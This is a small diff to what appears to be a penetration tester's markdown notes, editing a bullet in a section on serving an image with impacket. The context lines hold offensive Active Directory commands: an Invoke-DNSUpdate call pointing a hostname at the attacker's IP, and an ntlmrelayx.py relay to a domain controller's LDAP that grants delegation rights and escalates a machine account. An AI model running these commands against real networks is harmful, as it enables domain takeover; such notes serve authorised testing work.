@@ -1051,7 +1051,7 @@ Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> 
 - Didn't test dnstool for this attack
 
 #### Serve image with impacket
-- Can either relay to `ldap` or `ldaps` -t ldap://<DC>
+- Can either relay to `ldap` or `ldaps`
 ```
 sudo python3 ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
 ```
